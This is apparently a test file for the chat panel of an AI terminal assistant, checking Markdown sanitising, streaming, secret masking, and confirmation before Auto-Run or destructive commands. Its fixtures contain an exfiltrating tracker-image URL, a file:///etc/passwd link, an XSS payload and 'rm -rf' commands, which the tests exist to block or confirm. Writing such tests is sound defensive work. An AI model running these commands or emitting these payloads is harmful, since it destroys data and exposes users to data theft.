import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { act, fireEvent, render, screen, waitFor, within } from '@testing-library/react';
import type { ChatRequestBody, ChatStreamEvent } from '@shared/chat';
import { ConfirmProvider } from '@/components/ui/Confirm';
import { ToastProvider } from '@/components/ui/Toast';
import { setLanguage } from '@/i18n';
import { reportUndelivered } from '@/features/terminal/commandDelivery';
import { flushTerminalIssues, ingestTerminalOutput, resetTerminalIssues, useTerminalIssueStore } from '@/lib/terminalIssues';
import { rememberTerminalSecrets } from '@/lib/terminalSecrets';
import { useAppStore } from '@/store/appStore';
import { appendTerminalOutput, clearTerminalOutput } from '@/store/terminalOutput';
import type { WorkspaceServer } from '@/workspace/types';
import ChatPanel, { type ChatPanelProps } from './ChatPanel';

const SERVER: WorkspaceServer = { id: 1, name: 'web-1', ip: '10.0.0.5', type: 'linux', osDetail: 'Ubuntu 22.04' };

type Call = { url: string; method: string; body: unknown; signal?: AbortSignal | null };

// A streamed /api/chat answer the test drives event by event.
function sseStream(signal?: AbortSignal | null) {
    let controller!: ReadableStreamDefaultController<Uint8Array>;
    const encoder = new TextEncoder();
    const body = new ReadableStream<Uint8Array>({ start: (c) => { controller = c; } });
    signal?.addEventListener('abort', () => controller.error(new DOMException('The operation was aborted.', 'AbortError')));
    return {
        response: new Response(body, { headers: { 'content-type': 'text/event-stream' } }),
        send: (event: ChatStreamEvent) => controller.enqueue(encoder.encode(`data: ${JSON.stringify(event)}\n\n`)),
        close: () => controller.close()
    };
}

let calls: Call[];
let historyReply: () => Promise<Response>;
let chatReply: (body: ChatRequestBody, signal?: AbortSignal | null) => Response;
let streams: Array<ReturnType<typeof sseStream>>;
let minimaxRoute: 'proxy' | 'direct';

const json = (body: unknown, status = 200) =>
    new Response(JSON.stringify(body), { status, headers: { 'content-type': 'application/json' } });

// Answers a streamed request in one go.
const answerWith = (text: string, extra: ChatStreamEvent[] = []) => (_body: ChatRequestBody, signal?: AbortSignal | null) => {
    const stream = sseStream(signal);
    stream.send({ type: 'model', model: 'MiniMax-M3' });
    stream.send({ type: 'delta', text });
    extra.forEach(stream.send);
    stream.send({ type: 'done', usedModel: 'MiniMax-M3', fullText: text });
    stream.close();
    return stream.response;
};

beforeEach(() => {
    setLanguage('en');
    useAppStore.setState(useAppStore.getInitialState(), true);
    clearTerminalOutput(1);
    window.localStorage.clear();
    calls = [];
    streams = [];
    historyReply = async () => json({ messages: [] });
    chatReply = answerWith('ok');
    minimaxRoute = 'proxy';
    vi.stubGlobal('fetch', vi.fn(async (url: string, init: RequestInit = {}) => {
        const method = init.method ?? 'GET';
        const body = typeof init.body === 'string' ? JSON.parse(init.body) : undefined;
        calls.push({ url, method, body, signal: init.signal });
        if (url.endsWith('/api/config/model')) return json({ model: 'MiniMax-M3' });
        if (url.endsWith('/api/config/status')) {
            return json({
                features: {
                    minimaxProxy: { route: minimaxRoute, baseUrl: 'https://ai-proxy.luisbh.com/anthropic/v1', apiBaseUrl: 'https://api.minimax.io/anthropic' }
                }
            });
        }
        if (url.includes('/api/chat/history/') && method === 'GET') return historyReply();
        if (url.includes('/api/chat/history/')) return json({ message: 'success' });
        if (url.endsWith('/api/chat')) return chatReply(body as ChatRequestBody, init.signal);
        return json({});
    }));
    Object.assign(navigator, { clipboard: { writeText: vi.fn(async () => undefined) } });
});

afterEach(() => {
    vi.unstubAllGlobals();
    setLanguage('system');
});

function renderChat(props: Partial<ChatPanelProps> = {}) {
    return render(
        <ToastProvider>
            <ConfirmProvider>
                <ChatPanel activeServer={SERVER} connectionState="connected" {...props} />
            </ConfirmProvider>
        </ToastProvider>
    );
}

const composer = () => screen.getByRole('textbox', { name: 'Message for the AI assistant' });
const chatCalls = () => calls.filter((call) => call.url.endsWith('/api/chat'));
const puts = () => calls.filter((call) => call.method === 'PUT');
// The panel's announcer (copy buttons have small live regions of their own).
const liveRegion = () => document.querySelector('div.sr-only[aria-live="polite"]');
const issueCard = () => screen.getByRole('region', { name: 'Last terminal issue' });

function type(text: string) {
    fireEvent.change(composer(), { target: { value: text } });
}

async function sendMessage(text: string) {
    type(text);
    fireEvent.keyDown(composer(), { key: 'Enter' });
    await waitFor(() => expect(chatCalls().length).toBeGreaterThan(0));
}

describe('ChatPanel', () => {
    it('restores the saved conversation and renders Markdown safely', async () => {
        historyReply = async () => json({
            messages: [
                { role: 'user', content: 'how do I check disks?' },
                { role: 'assistant', content: '## Disks\n\n1. Run the check\n2. Read [the docs](https://docs.example.com/df)\n\n| col | val |\n|---|---|\n| a | b |\n\n![tracker](https://evil.example/pixel.png?data=secret)\n\n[local](file:///etc/passwd) <img src=x onerror=alert(1)>' }
            ]
        });
        renderChat();

        expect(await screen.findByText('how do I check disks?')).toBeInTheDocument();
        expect(screen.getByText('Connected to web-1. Ready to help.')).toBeInTheDocument();
        expect(screen.getByRole('heading', { name: 'Disks' })).toBeInTheDocument();
        expect(screen.getByRole('table')).toBeInTheDocument();

        const docs = screen.getByRole('link', { name: 'the docs' });
        expect(docs).toHaveAttribute('href', 'https://docs.example.com/df');
        expect(docs).toHaveAttribute('target', '_blank');
        expect(docs).toHaveAttribute('rel', 'noopener noreferrer');

        // Images are never fetched: their URL is shown as a link instead.
        expect(document.querySelector('img')).toBeNull();
        expect(screen.getByText('https://evil.example/pixel.png?data=secret')).toBeInTheDocument();
        // Unsafe links lose their href; raw HTML is shown as text.
        expect(screen.queryByRole('link', { name: 'local' })).toBeNull();
        expect(screen.getByText(/<img src=x onerror=alert\(1\)>/)).toBeInTheDocument();
    });

    it('renders a long restored conversation newest first, then the older messages in batches', { timeout: 20000 }, async () => {
        // The older messages are added while the browser is idle. The test
        // plays the idle periods itself, one batch at a time: jsdom renders
        // Markdown slowly (one message per batch), and timers polled under a
        // loaded test run took longer than any wait (a flake on Linux).
        const idle = new Map<number, IdleRequestCallback>();
        let nextIdle = 0;
        vi.stubGlobal('requestIdleCallback', (callback: IdleRequestCallback) => {
            nextIdle += 1;
            idle.set(nextIdle, callback);
            return nextIdle;
        });
        vi.stubGlobal('cancelIdleCallback', (id: number) => idle.delete(id));
        historyReply = async () => json({
            messages: Array.from({ length: 60 }, (_, i) => (i % 2
                ? { role: 'assistant', content: `answer ${i}\n\n${'The service restarted cleanly. '.repeat(40)}` }
                : { role: 'user', content: `question ${i}` }))
        });
        renderChat();

        expect(await screen.findByText('answer 59')).toBeInTheDocument();
        // The click that selected the server does not render all 60 at once.
        expect(screen.queryByText('question 0')).toBeNull();
        const first = document.querySelectorAll('[role="log"] .group').length;
        expect(first).toBeGreaterThan(0);
        expect(first).toBeLessThan(30);

        // Each idle period adds a batch of older messages above, and asks for
        // the next one until none is left.
        let batches = 0;
        while (idle.size > 0 && batches < 100) {
            const [id, callback] = idle.entries().next().value!;
            idle.delete(id);
            act(() => callback({ didTimeout: false, timeRemaining: () => 50 }));
            batches += 1;
        }
        expect(idle.size).toBe(0);
        expect(batches).toBeGreaterThan(1);
        expect(screen.getByText('question 0')).toBeInTheDocument();
        expect(document.querySelectorAll('[role="log"] .group')).toHaveLength(30);
        expect(screen.getByText('question 0').compareDocumentPosition(screen.getByText('answer 59')) & Node.DOCUMENT_POSITION_FOLLOWING).toBeTruthy();
        // Bubbles out of view skip layout: adding older messages above the
        // view does not lay out every message again.
        expect(screen.getByText('question 0')).toHaveClass('[content-visibility:auto]');
        expect(screen.getByText(/^answer 59/).closest('.rounded-xl')).toHaveClass('[content-visibility:auto]');

        // A new turn renders at once, below everything restored.
        chatReply = answerWith('fresh answer');
        await sendMessage('one more');
        expect(await screen.findByText('fresh answer')).toBeInTheDocument();
    });

    it('streams an answer, sends the prior turns and context, and saves only the conversation', async () => {
        chatReply = (_body, signal) => {
            const stream = sseStream(signal);
            streams.push(stream);
            return stream.response;
        };
        renderChat({ terminalIssues: [{ id: 'i1', type: 'error', message: 'nginx: [emerg] bind() failed', timestamp: 1 }] });
        await waitFor(() => expect(calls.some((call) => call.url.includes('/api/chat/history/1'))).toBe(true));

        await sendMessage('why is nginx down?');
        expect(composer()).toHaveValue('');
        expect(chatCalls()[0].body).toMatchObject({
            purpose: 'chat',
            message: 'why is nginx down?',
            serverId: 1,
            osDetail: 'Ubuntu 22.04',
            history: [],
            stream: true,
            model: 'MiniMax-M3',
            issues: ['ERROR: nginx: [emerg] bind() failed']
        });

        const [stream] = streams;
        act(() => stream.send({ type: 'model', model: 'MiniMax-M3' }));
        act(() => stream.send({ type: 'delta', text: 'Port 80 is ' }));
        expect(await screen.findByText(/Port 80 is/)).toBeInTheDocument();
        expect(screen.getByRole('button', { name: 'Stop' })).toBeInTheDocument();

        act(() => {
            stream.send({ type: 'delta', text: 'busy.' });
            stream.send({ type: 'done', usedModel: 'MiniMax-M3', fullText: 'Port 80 is busy.' });
            stream.close();
        });
        expect(await screen.findByText('Port 80 is busy.')).toBeInTheDocument();

        await waitFor(() => expect(puts().length).toBe(1), { timeout: 2000 });
        expect(puts()[0].body).toEqual({
            messages: [{ role: 'user', content: 'why is nginx down?' }, { role: 'assistant', content: 'Port 80 is busy.' }]
        });
    });

    it('does not send while an IME composition is in progress', async () => {
        renderChat();
        type('日本語');
        fireEvent.keyDown(composer(), { key: 'Enter', keyCode: 229 });
        fireEvent.keyDown(composer(), { key: 'Enter', isComposing: true });
        expect(chatCalls()).toHaveLength(0);
        expect(composer()).toHaveValue('日本語');
    });

    it('offers Run only for shell blocks and queues the exact block', async () => {
        const heredoc = "cat > app.yml <<'EOF'\nservices:\n  web:\n    # comment\n    image: nginx\nEOF";
        historyReply = async () => json({
            messages: [
                { role: 'user', content: 'compose file?' },
                { role: 'assistant', content: `Write it:\n\`\`\`bash\n${heredoc}\n\`\`\`\nIt looks like:\n\`\`\`yaml\nservices: {}\n\`\`\`` }
            ]
        });
        renderChat();
        await screen.findByText('Write it:');

        const runButtons = screen.getAllByRole('button', { name: 'Run' });
        expect(runButtons).toHaveLength(1);
        expect(screen.getByText('· Reference only')).toBeInTheDocument();

        fireEvent.click(runButtons[0]);
        expect(useAppStore.getState().pendingCommands[1]).toEqual([expect.objectContaining({ command: heredoc, source: 'ai' })]);
    });

    it('renders a fence glued to a sentence as a block, and closes a block a finished answer left open', async () => {
        chatReply = (_body, signal) => {
            const stream = sseStream(signal);
            streams.push(stream);
            return stream.response;
        };
        renderChat();
        await sendMessage('como vamos de recursos?');
        const text = 'Reviso los recursos.```bash\nfree -m\nuptime';
        act(() => streams[0].send({ type: 'delta', text }));
        expect(await screen.findByText('Reviso los recursos.')).toBeInTheDocument();
        expect(screen.getByText('Waiting for the end of the block…')).toBeInTheDocument();
        expect(screen.queryByRole('button', { name: 'Run' })).toBeNull();

        act(() => {
            streams[0].send({ type: 'done', usedModel: 'MiniMax-M3', fullText: text });
            streams[0].close();
        });
        fireEvent.click(await screen.findByRole('button', { name: 'Run' }));
        expect(screen.queryByText('Waiting for the end of the block…')).toBeNull();
        expect(useAppStore.getState().pendingCommands[1]).toEqual([expect.objectContaining({ command: 'free -m\nuptime', source: 'ai' })]);
    });

    it('restores a stopped answer as stopped: its unterminated block gets no Run button', async () => {
        historyReply = async () => json({
            messages: [
                { role: 'user', content: 'free some space in /tmp' },
                { role: 'assistant', content: 'Remove the build cache:\n\n```bash\nchmod -R 000 /tmp/build-ca', partial: true }
            ]
        });
        renderChat();
        expect(await screen.findByText('Remove the build cache:')).toBeInTheDocument();
        expect(screen.getByText('chmod -R 000 /tmp/build-ca')).toBeInTheDocument();
        expect(screen.getByText('Stopped')).toBeInTheDocument();
        expect(screen.queryByRole('button', { name: 'Run' })).toBeNull();

        // Sent back as an interrupted answer, and saved that way again.
        await sendMessage('go on');
        expect(chatCalls()[0].body).toMatchObject({
            history: [{ role: 'user', content: 'free some space in /tmp' }, { role: 'assistant', content: expect.stringContaining('build-ca'), partial: true }]
        });
        await waitFor(() => expect(puts().length).toBeGreaterThan(0), { timeout: 2000 });
        expect((puts().at(-1)?.body as { messages: Array<{ partial?: boolean }> }).messages[1].partial).toBe(true);
    });

    it('asks before running a destructive command', async () => {
        historyReply = async () => json({
            messages: [{ role: 'user', content: 'clean' }, { role: 'assistant', content: '```bash\nsudo rm -rf / --no-preserve-root\n```' }]
        });
        renderChat();
        fireEvent.click(await screen.findByRole('button', { name: 'Run' }));

        expect(await screen.findByText('Run a destructive command?')).toBeInTheDocument();
        fireEvent.click(screen.getByRole('button', { name: 'Cancel' }));
        await waitFor(() => expect(screen.queryByText('Run a destructive command?')).toBeNull());
        expect(useAppStore.getState().pendingCommands[1]).toBeUndefined();

        fireEvent.click(screen.getByRole('button', { name: 'Run' }));
        fireEvent.click(await screen.findByRole('button', { name: 'Run anyway' }));
        await waitFor(() => expect(useAppStore.getState().pendingCommands[1]).toHaveLength(1));
    });

    it('Stop aborts the stream and keeps the partial answer, marked as stopped', async () => {
        chatReply = (_body, signal) => {
            const stream = sseStream(signal);
            streams.push(stream);
            return stream.response;
        };
        renderChat();
        await sendMessage('long answer please');
        act(() => streams[0].send({ type: 'delta', text: 'First part' }));
        await screen.findByText('First part');

        fireEvent.click(screen.getByRole('button', { name: 'Stop' }));

        expect(await screen.findByText('Stopped')).toBeInTheDocument();
        expect(chatCalls()[0].signal?.aborted).toBe(true);
        expect(screen.getByRole('button', { name: 'Send (Enter)' })).toBeInTheDocument();
    });

    it('shows request errors as translated errors that are never saved or sent as history', async () => {
        chatReply = () => json({ error: 'Please set your GEMINI_API_KEY in Settings or Environment variables.', code: 'AI_KEY_MISSING', details: { provider: 'gemini' } }, 409);
        renderChat();
        await sendMessage('restart nginx');

        expect(await screen.findByRole('alert')).toHaveTextContent('This model needs a Gemini API key. Add it in Settings, or choose a MiniMax model.');
        expect(screen.getByRole('alert')).not.toHaveTextContent('GEMINI_API_KEY');
        act(() => setLanguage('es'));
        expect(screen.getByRole('alert')).toHaveTextContent('Este modelo necesita una clave de API de Gemini. Añádela en Ajustes o elige un modelo de MiniMax.');
        act(() => setLanguage('en'));
        expect(within(screen.getByRole('alert')).getByRole('button', { name: 'Try again' })).toBeInTheDocument();

        await waitFor(() => expect(puts().length).toBe(1), { timeout: 2000 });
        expect(puts()[0].body).toEqual({ messages: [{ role: 'user', content: 'restart nginx' }] });

        chatReply = answerWith('done');
        fireEvent.click(within(screen.getByRole('alert')).getByRole('button', { name: 'Try again' }));
        await waitFor(() => expect(chatCalls()).toHaveLength(2));
        expect(chatCalls()[1].body).toMatchObject({ message: 'restart nginx', history: [] });
        expect(await screen.findByText('done')).toBeInTheDocument();
    });

    it('asks for a saved key that no longer decrypts to be entered again', async () => {
        chatReply = () => json({ error: 'The saved Gemini API key cannot be decrypted (the data key changed). Enter it again in Settings.', code: 'SECRET_UNREADABLE', details: { provider: 'gemini' } }, 409);
        renderChat();
        await sendMessage('restart nginx');

        expect(await screen.findByRole('alert')).toHaveTextContent('The saved Gemini API key cannot be decrypted (the database was moved without its data key). Enter the key again in Settings, or choose a MiniMax model.');
        act(() => setLanguage('es'));
        expect(screen.getByRole('alert')).toHaveTextContent('La clave de API de Gemini guardada no se puede descifrar');
    });

    it('keeps messages sent before a late history restore', async () => {
        let resolveHistory!: (response: Response) => void;
        historyReply = () => new Promise((resolve) => { resolveHistory = resolve; });
        chatReply = answerWith('fresh answer');
        renderChat();

        await sendMessage('quick question');
        await screen.findByText('fresh answer');
        await act(async () => resolveHistory(json({ messages: [{ role: 'user', content: 'old question' }, { role: 'assistant', content: 'old answer' }] })));

        await screen.findByText('old answer');
        const texts = ['old question', 'old answer', 'quick question', 'fresh answer'].map((text) => screen.getByText(text));
        for (let i = 1; i < texts.length; i++) {
            expect(texts[i - 1].compareDocumentPosition(texts[i]) & Node.DOCUMENT_POSITION_FOLLOWING).toBeTruthy();
        }
    });

    it('clearing the conversation cancels a pending save', async () => {
        chatReply = answerWith('an answer');
        renderChat();
        await waitFor(() => expect(calls.some((call) => call.method === 'GET' && call.url.includes('/history/'))).toBe(true));
        await sendMessage('remember this');
        await screen.findByText('an answer');

        fireEvent.click(screen.getByRole('button', { name: 'Clear conversation' }));
        fireEvent.click(await screen.findByRole('button', { name: 'Clear' }));

        await waitFor(() => expect(calls.some((call) => call.method === 'DELETE')).toBe(true));
        await new Promise((resolve) => setTimeout(resolve, 800));
        expect(puts()).toHaveLength(0);
        expect(screen.queryByText('remember this')).toBeNull();
    });

    it('requires an explicit confirmation before Auto-Run and runs shell blocks with the auto-run source', async () => {
        chatReply = answerWith('Checking:\n```bash\nuptime\n```');
        renderChat();
        const toggle = screen.getByRole('button', { name: /AUTO/ });
        expect(toggle).toHaveAttribute('aria-pressed', 'false');

        fireEvent.click(toggle);
        expect(await screen.findByText('Enable Auto-Run?')).toBeInTheDocument();
        // The machine is named in the body, where it is never truncated.
        const target = screen.getByText('web-1');
        expect(target.previousElementSibling).toHaveTextContent('Commands will run on');
        expect(target).not.toHaveClass('truncate');
        fireEvent.click(screen.getByRole('button', { name: 'Cancel' }));
        expect(toggle).toHaveAttribute('aria-pressed', 'false');

        fireEvent.click(toggle);
        fireEvent.click(await screen.findByRole('button', { name: 'Enable Auto-Run' }));
        expect(toggle).toHaveAttribute('aria-pressed', 'true');
        expect(screen.getByRole('log')).toHaveTextContent('Auto-Run is on for web-1.');
        // Notices are announced: the log itself is not a live region.
        expect(liveRegion()).toHaveTextContent('Auto-Run is on for web-1.');

        await sendMessage('is it up?');
        // The AI is told that its blocks run by themselves.
        expect(chatCalls()[0].body).toMatchObject({ purpose: 'chat', autoRun: true });
        await waitFor(() => expect(useAppStore.getState().pendingCommands[1]).toEqual([expect.objectContaining({ command: 'uptime', source: 'ai-autorun' })]));
        expect(await screen.findByRole('status')).toHaveTextContent(/step 1 of 5/);

        fireEvent.click(screen.getByRole('button', { name: 'Stop Auto-Run' }));
        await waitFor(() => expect(liveRegion()).toHaveTextContent('Auto-Run stopped.'));
        expect(screen.getByRole('log')).toHaveTextContent('Auto-Run stopped.');
        expect(screen.queryByText(/step 1 of 5/)).toBeNull();
    });

    it('turns Auto-Run off when the chat is closed, cancelling the analysis in flight', async () => {
        chatReply = (body, signal) => {
            if (body.purpose === 'chat') return answerWith('Checking:\n```bash\nuptime\n```')(body, signal);
            const stream = sseStream(signal);
            streams.push(stream);
            return stream.response;
        };
        renderChat();
        const toggle = screen.getByRole('button', { name: /AUTO/ });
        fireEvent.click(toggle);
        fireEvent.click(await screen.findByRole('button', { name: 'Enable Auto-Run' }));

        await sendMessage('is it up?');
        await waitFor(() => expect(useAppStore.getState().pendingCommands[1]).toEqual([expect.objectContaining({ command: 'uptime', source: 'ai-autorun' })]));
        // The terminal runs it and returns to its prompt: the output goes to the AI.
        act(() => appendTerminalOutput(1, 'user@web-1:~$ uptime\r\n 10:00:00 up 3 days\r\nuser@web-1:~$ '));
        await waitFor(() => expect(chatCalls().map((call) => (call.body as ChatRequestBody).purpose)).toEqual(['chat', 'autorun-step']), { timeout: 4000 });

        act(() => useAppStore.getState().setChatOpen(false));

        expect(chatCalls()[1].signal?.aborted).toBe(true);
        expect(toggle).toHaveAttribute('aria-pressed', 'false');
        expect(screen.getByRole('log')).toHaveTextContent('Auto-Run turned off: the chat was closed.');
        expect(screen.queryByRole('status')).toBeNull();

        // Reopening does not turn it back on.
        act(() => useAppStore.getState().setChatOpen(true));
        expect(toggle).toHaveAttribute('aria-pressed', 'false');
    });

    it('shows why Auto-Run went off when the chat is opened again', async () => {
        renderChat();
        fireEvent.click(screen.getByRole('button', { name: /AUTO/ }));
        fireEvent.click(await screen.findByRole('button', { name: 'Enable Auto-Run' }));
        await waitFor(() => expect(screen.getByRole('log')).toHaveTextContent('Auto-Run is on for web-1.'));

        // A hidden list (display: none) has no height and keeps its offset.
        const log = screen.getByRole('log');
        let top = 0;
        Object.defineProperty(log, 'scrollHeight', { configurable: true, get: () => (useAppStore.getState().chatOpen ? 1200 : 0) });
        Object.defineProperty(log, 'clientHeight', { configurable: true, get: () => (useAppStore.getState().chatOpen ? 400 : 0) });
        Object.defineProperty(log, 'scrollTop', { configurable: true, get: () => top, set: (value: number) => { if (useAppStore.getState().chatOpen) top = value; } });
        top = 500;

        act(() => useAppStore.getState().setChatOpen(false));
        expect(log).toHaveTextContent('Auto-Run turned off: the chat was closed.');
        act(() => useAppStore.getState().setChatOpen(true));
        // The notice at the end is in view, not below the old offset.
        expect(top).toBe(1200);
    });

    it('turns Auto-Run off when another open server is shown', async () => {
        act(() => useAppStore.getState().activateServer(1));
        renderChat();
        const toggle = screen.getByRole('button', { name: /AUTO/ });
        fireEvent.click(toggle);
        fireEvent.click(await screen.findByRole('button', { name: 'Enable Auto-Run' }));
        expect(toggle).toHaveAttribute('aria-pressed', 'true');

        // The chat stays mounted in the background, but nobody sees it.
        act(() => useAppStore.getState().activateServer(2));
        expect(toggle).toHaveAttribute('aria-pressed', 'false');
        expect(screen.getByRole('log')).toHaveTextContent('Auto-Run turned off: another server was selected.');

        act(() => useAppStore.getState().activateServer(1));
        expect(toggle).toHaveAttribute('aria-pressed', 'false');
    });

    it('ends the Auto-Run chain when the terminal does not type its step', async () => {
        chatReply = answerWith('Checking:\n```bash\nuptime\n```');
        renderChat();
        const toggle = screen.getByRole('button', { name: /AUTO/ });
        fireEvent.click(toggle);
        fireEvent.click(await screen.findByRole('button', { name: 'Enable Auto-Run' }));
        await sendMessage('is it up?');
        await waitFor(() => expect(useAppStore.getState().pendingCommands[1]).toEqual([expect.objectContaining({ command: 'uptime', source: 'ai-autorun' })]));
        expect(await screen.findByRole('status')).toHaveTextContent(/step 1 of 5/);

        // Another server's report, or a command the user queued, is not this chain's.
        act(() => reportUndelivered({ command: 'uptime', source: 'ai-autorun' }, 2, 'full-screen'));
        act(() => reportUndelivered({ command: 'uptime', source: 'ai' }, 1, 'full-screen'));
        expect(screen.getByRole('status')).toHaveTextContent(/step 1 of 5/);

        act(() => reportUndelivered({ command: 'uptime', source: 'ai-autorun' }, 1, 'full-screen'));
        expect(screen.getByRole('log')).toHaveTextContent('Auto-Run stopped: a full-screen program (vi, less, top…) holds the terminal, so the step was not typed.');
        expect(screen.queryByText(/step 1 of 5/)).toBeNull();
        // Auto-Run itself stays on for the next message.
        expect(toggle).toHaveAttribute('aria-pressed', 'true');
    });

    it('ends the Auto-Run chain when the focused tab is a shell inside a container (W7-S3)', async () => {
        chatReply = answerWith('Checking:\n```bash\nuptime\n```');
        renderChat();
        fireEvent.click(screen.getByRole('button', { name: /AUTO/ }));
        fireEvent.click(await screen.findByRole('button', { name: 'Enable Auto-Run' }));
        await sendMessage('is it up?');
        expect(await screen.findByRole('status')).toHaveTextContent(/step 1 of 5/);
        act(() => reportUndelivered({ command: 'uptime', source: 'ai-autorun' }, 1, 'container-shell'));
        expect(screen.getByRole('log')).toHaveTextContent('Auto-Run stopped: the selected terminal tab is a shell inside a container');
        expect(screen.queryByText(/step 1 of 5/)).toBeNull();
    });

    // W7 integration (S3 + S5): the AI knows when the terminal it reads is a container's shell.
    it('says when the focused terminal tab is a shell inside a container, and tells the AI', async () => {
        const store = useAppStore.getState();
        const host = store.openTerminalSession(1);
        const inContainer = store.openTerminalSession(1, { attach: { kind: 'container', engine: 'docker', container: 'shop-web-1' } });
        renderChat();
        expect(screen.getByText(/The selected terminal tab is a shell inside the container shop-web-1 \(docker\)/)).toBeInTheDocument();
        await sendMessage('why is it slow?');
        expect(chatCalls()[0].body).toMatchObject({ terminalShell: { kind: 'container', engine: 'docker', container: 'shop-web-1' } });

        act(() => useAppStore.getState().focusTerminalSession(1, host));
        expect(screen.queryByText(/shell inside the container/)).toBeNull();
        await sendMessage('and now?');
        await waitFor(() => expect(chatCalls()).toHaveLength(2));
        expect(chatCalls()[1].body).not.toHaveProperty('terminalShell');
        expect(inContainer).not.toBe(host);
    });

    // A Windows server opens on its Remote Desktop: its shell waits for its tab.
    it('greets a server whose shell is not connected yet', () => {
        renderChat({ activeServer: { ...SERVER, type: 'windows', osDetail: undefined }, connectionState: 'idle' });
        expect(screen.getByText('The shell of web-1 is not connected yet: it connects when you open its tab or run a command from here. Ask me anything meanwhile.')).toBeInTheDocument();
    });

    it('keeps an answer the user asked for streaming while the chat is closed', async () => {
        chatReply = (_body, signal) => {
            const stream = sseStream(signal);
            streams.push(stream);
            return stream.response;
        };
        renderChat();
        fireEvent.click(screen.getByRole('button', { name: /AUTO/ }));
        fireEvent.click(await screen.findByRole('button', { name: 'Enable Auto-Run' }));
        await sendMessage('explain the load average');

        act(() => useAppStore.getState().setChatOpen(false));
        expect(chatCalls()[0].signal?.aborted).toBe(false);
        act(() => {
            streams[0].send({ type: 'done', usedModel: 'MiniMax-M3', fullText: 'Run it:\n```bash\nuptime\n```' });
            streams[0].close();
        });
        expect(await screen.findByText('uptime')).toBeInTheDocument();
        // Auto-Run is off: the block waits for a click.
        expect(useAppStore.getState().pendingCommands[1]).toBeUndefined();
    });

    it('pauses Auto-Run before a destructive command', async () => {
        chatReply = answerWith('Freeing space:\n```bash\nrm -rf /var\n```');
        renderChat();
        fireEvent.click(screen.getByRole('button', { name: /AUTO/ }));
        fireEvent.click(await screen.findByRole('button', { name: 'Enable Auto-Run' }));

        await sendMessage('free some space');
        expect(await screen.findByText('Auto-Run paused before a destructive command')).toBeInTheDocument();
        expect(useAppStore.getState().pendingCommands[1]).toBeUndefined();

        fireEvent.click(screen.getByRole('button', { name: 'Skip' }));
        expect(await within(screen.getByRole('log')).findByText('Destructive command skipped. Auto-Run stopped.')).toBeInTheDocument();
        expect(liveRegion()).toHaveTextContent('Destructive command skipped. Auto-Run stopped.');
        expect(useAppStore.getState().pendingCommands[1]).toBeUndefined();
    });

    // W7-S4: a snippet's secret typed into the terminal never reaches the AI provider.
    it('sends the terminal text and issues with the secret values typed into the terminal masked', async () => {
        rememberTerminalSecrets(1, [{ name: 'password', value: 'TermSecret-4242-xyz' }]);
        appendTerminalOutput(1, 'demo:~$  echo "configuring app with TermSecret-4242-xyz" && printf %s TermSecret-4242-xyz > /tmp/app.pw\r\n');
        appendTerminalOutput(1, 'configuring app with TermSecret-4242-xyz\r\ndemo:~$ ');
        ingestTerminalOutput(1, 'error: TermSecret-4242-xyz rejected\r\n');
        flushTerminalIssues(1);
        renderChat({ terminalIssues: useTerminalIssueStore.getState().issues[1] });

        await sendMessage('what happened?');
        const sent = JSON.stringify(chatCalls()[0].body);
        expect(sent).not.toContain('TermSecret');
        expect(chatCalls()[0].body).toMatchObject({
            terminalOutput: expect.stringContaining('configuring app with {{password}}'),
            issues: ['ERROR: error: {{password}} rejected']
        });

        fireEvent.click(screen.getByRole('button', { name: 'Fix it' }));
        await waitFor(() => expect(chatCalls()).toHaveLength(2));
        expect(JSON.stringify(chatCalls()[1].body)).not.toContain('TermSecret');
        resetTerminalIssues(1);
    });

    it('Fix it suggests only a runnable block and shows failures as errors', async () => {
        const issues = [{ id: 'i1', type: 'error' as const, message: 'bash: dockr: command not found', timestamp: 1 }];
        chatReply = () => json({ response: 'Typo:\n```bash\ndocker ps\n```', usedModel: 'MiniMax-M3' });
        renderChat({ terminalIssues: issues });

        fireEvent.click(screen.getByRole('button', { name: 'Fix it' }));
        expect(await screen.findByText('Suggested command')).toBeInTheDocument();
        expect(chatCalls()[0].body).toMatchObject({ purpose: 'fix-it', issues: ['ERROR: bash: dockr: command not found'] });
        expect(chatCalls()[0].body).not.toHaveProperty('stream');
        fireEvent.click(within(issueCard()).getByRole('button', { name: 'Run' }));
        expect(useAppStore.getState().pendingCommands[1]).toEqual([expect.objectContaining({ command: 'docker ps', source: 'ai' })]);

        chatReply = () => json({ error: '502 MiniMax proxy unreachable', code: 'AI_PROVIDER_ERROR' }, 502);
        fireEvent.click(screen.getByRole('button', { name: 'Fix it' }));
        expect(await screen.findByText("Couldn't get a fix: The AI provider returned an error: 502 MiniMax proxy unreachable")).toBeInTheDocument();
        expect(screen.queryByText('Suggested command')).toBeNull();
    });

    it('drops a Fix it suggestion when its issue is replaced or dismissed', async () => {
        const first = { id: 'i1', type: 'error' as const, message: 'bash: dockr: command not found', timestamp: 1 };
        const second = { id: 'i2', type: 'error' as const, message: 'nginx: [emerg] bind() failed', timestamp: 2 };
        chatReply = () => json({ response: '```bash\ndocker ps\n```', usedModel: 'MiniMax-M3' });
        const view = renderChat({ terminalIssues: [first] });

        fireEvent.click(screen.getByRole('button', { name: 'Fix it' }));
        expect(await screen.findByText('Suggested command')).toBeInTheDocument();

        // A newer issue: the old suggestion must not appear under it.
        view.rerender(
            <ToastProvider>
                <ConfirmProvider>
                    <ChatPanel activeServer={SERVER} connectionState="connected" terminalIssues={[first, second]} />
                </ConfirmProvider>
            </ToastProvider>
        );
        expect(within(issueCard()).getByText('nginx: [emerg] bind() failed', { selector: 'div' })).toBeInTheDocument();
        expect(screen.queryByText('Suggested command')).toBeNull();

        // Back to the first issue (the second was dismissed): still nothing stale.
        view.rerender(
            <ToastProvider>
                <ConfirmProvider>
                    <ChatPanel activeServer={SERVER} connectionState="connected" terminalIssues={[first]} />
                </ConfirmProvider>
            </ToastProvider>
        );
        expect(screen.queryByText('Suggested command')).toBeNull();
    });

    it('collapses the issue card and expands it again for Fix it', async () => {
        chatReply = () => json({ response: '```bash\ndocker ps\n```', usedModel: 'MiniMax-M3' });
        renderChat({
            terminalIssues: [
                { id: 'i1', type: 'warning', message: 'disk 91% full', timestamp: 1 },
                { id: 'i2', type: 'error', message: 'bash: dockr: command not found', timestamp: 2 }
            ]
        });
        const toggle = within(issueCard()).getByRole('button', { name: /Last terminal issue/ });
        expect(toggle).toHaveAttribute('aria-expanded', 'true');
        expect(within(issueCard()).getByText('Recent issues')).toBeVisible();

        fireEvent.click(toggle);
        expect(toggle).toHaveAttribute('aria-expanded', 'false');
